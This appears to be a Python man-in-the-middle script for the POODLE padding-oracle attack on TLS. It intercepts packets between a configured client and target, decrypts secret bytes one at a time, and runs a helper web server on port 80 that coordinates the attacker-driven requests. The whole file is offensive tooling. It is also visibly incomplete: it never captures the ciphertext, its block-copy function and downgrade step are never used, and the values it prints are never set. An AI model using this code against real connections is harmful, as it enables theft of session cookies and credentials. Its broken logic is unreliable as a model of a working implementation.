#!/usr/bin/env python3

from scapy.layers.tls.all import TLS
from netfilterqueue import NetfilterQueue
from scapy.all import *
import json
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import threading
import time
from scapy.all import IP, TCP
import os

DEBUG = False

# Track sessions using src_port as key
sessions = {}

# Initialize attempt count
attempt_count = 0  # Add a variable to track the number of attempts


class Session:
    def __init__(self, src_port):
        self.downgrade_needed = True
        self.src_port = src_port
        self.ciphertext = None
        self.last_seq = None
        self.block = None


# For exploit stage
block_to_move = 1
current_offset = 0
secret = {}
count = 0
number_of_requests = {}

request_length_count = {}
option_request_length = None
ciphertext_length = 0
post_request_length = None
option_response_length = None
skip_first_response = True
previous_block_last_byte = None
last_block_last_byte = None
block_size = 0

load_layer('tls')

config = json.load(open('config.json'))
log_file = open('intercept.log', 'w')


def get_field(layer, field_name):
    return layer.get_field(field_name).i2repr(layer, getattr(layer, field_name))


def copy_block_to_end(arr, copy_index):
    return arr[:-block_size] + arr[copy_index:(copy_index+block_size)]


def modify_and_send_packet(packet, pkt):
    del pkt[IP].chksum
    del pkt[TCP].chksum
    pkt[IP].len = len(pkt)
    packet.set_payload(bytes(pkt))
    packet.accept()


def log(text):
    if DEBUG:
        print(text)
    log_file.write(text + '\n')


def get_current_index():
    if block_size:
        return ((block_to_move + 1) * block_size) - current_offset
    return 0


def print_state(ciphertext_length=None, math_str=None):
    if not DEBUG:
        update_state_progress()

        if math_str is not None:
            print("Last Byte Decrypted: {}".format(math_str))

        plaintext = repr(''.join([chr(secret[i]) if i in secret else '.' for i in range(
            ciphertext_length)])) if ciphertext_length is not None else '......'
        print("Decrypted Plaintext: {}".format(plaintext))

        if ciphertext_length is not None and ciphertext_length != 0:
            percent_complete = len(secret) / ciphertext_length
        else:
            percent_complete = 0

        segment = int(percent_complete * 50)
        progress_bar = ("#" * segment) + (" " * (50-segment))
        print("Progress: [{}] {}%".format(
            progress_bar, int(percent_complete*100)))

        if len(number_of_requests) > 0:
            print("Average number of requests: {}".format(
                sum(number_of_requests.values()) / len(number_of_requests)))
        else:
            print("Average number of requests: N/A")


def update_state_progress():
    if not DEBUG and block_size is not None and post_request_length is not None:
        print("Block Size: {}, POST Request length: {}".format(block_size, post_request_length) + (
            ", OPTION Request length: {}".format(option_request_length) if option_request_length is not None else ""))
        current_index = get_current_index()
        try:
            print("Working on decrypting byte {} - Request #{}".format(
                current_index, number_of_requests[current_index]))
        except:
            pass


def callback(packet):
    global block_size
    global block_to_move
    global ciphertext_length
    global data_padding_size_needed
    global sessions
    global option_request_length
    global post_request_length
    global option_response_length
    global skip_first_response
    global current_offset
    global number_of_requests
    global request_length_count
    global attempt_count  # Track attempts

    decrypted_byte = None
    pkt = IP(packet.get_payload())

    # Increment attempt count for each packet processed
    attempt_count += 1

    # Handle the response from the target server, modify TLS packets related to POODLE
    if pkt.src == config['target'] and pkt.dst == config['client'] and 'TLS' in pkt:
        # POODLE attack processing
        if get_field(pkt.getlayer(TLS), 'type') == "application_data":

            # Decrypt byte
            session = sessions.get(pkt['TCP'].dport)
            if session:
                ciphertext = session.ciphertext
                if ciphertext:
                    decrypted_byte = (
                        block_size - 1) ^ ciphertext[((block_to_move) * block_size) - 1] ^ ciphertext[-block_size - 1]
                    secret[(block_to_move + 1) * block_size -
                           current_offset - 1] = decrypted_byte

                    # Log and end if we finish
                    if len(secret) == ciphertext_length:
                        log_result_and_end()

            sessions = {}

            print_state(ciphertext_length, "{} = {} ^ {} ^ {}".format(
                decrypted_byte, block_size - 1, previous_block_last_byte, last_block_last_byte))
            return

    # Standard packet acceptance
    packet.accept()


class Handler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        log(format.format(*args))

    def add_headers(self):
        self.send_header("Content-type", "text/plain")
        self.send_header('Access-Control-Allow-Origin', '*')

    def do_GET(self):
        global block_size
        global data_padding_size_needed
        global current_offset
        global block_to_move
        global number_of_requests
        global attempt_count  # Track attempts
        content = None

        while block_size == None:
            time.sleep(0.1)

        if self.path == '/blocksize':
            content = bytes(str(block_size), 'utf8')
        elif self.path == '/offset':
            for i in range(block_size):
                if ((block_to_move + 1) * block_size) - i - 1 not in secret:
                    current_offset = i
                    content = bytes(str(i), 'utf8')
                    break
            if content == None:
                block_to_move += 1
                current_offset = 0
                content = bytes('0', 'utf8')
            number_of_requests[get_current_index()] = 0

        elif self.path == '/attempts':
            # Display attempt count
            content = bytes(str(attempt_count), 'utf8')
        else:
            self.send_error(404, "Endpoint does not exist")
            return

        self.send_response(200)
        self.send_header('Content-Length', len(content))
        self.add_headers()
        self.end_headers()
        self.wfile.write(content)


class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass


web_server = ThreadingSimpleServer(('0.0.0.0', 80), Handler)
web_server_thread = threading.Thread(target=web_server.serve_forever)

nfqueue = NetfilterQueue()
nfqueue.bind(0, callback)


def log_result_and_end():
    global secret
    global ciphertext_length

    plaintext = repr(''.join(
        [chr(secret[i]) if i in secret else '.' for i in range(ciphertext_length)]))
    out_file = open('plaintext.txt', 'w')
    out_file.write(plaintext)
    out_file.close()

    nfqueue.unbind()
    web_server.shutdown()
    web_server_thread.join()
    log_file.close()

    os._exit(0)


try:
    web_server_thread.start()
    nfqueue.run()
except KeyboardInterrupt:
    pass

nfqueue.unbind()
web_server.shutdown()
web_server_thread.join()

log_file.close()
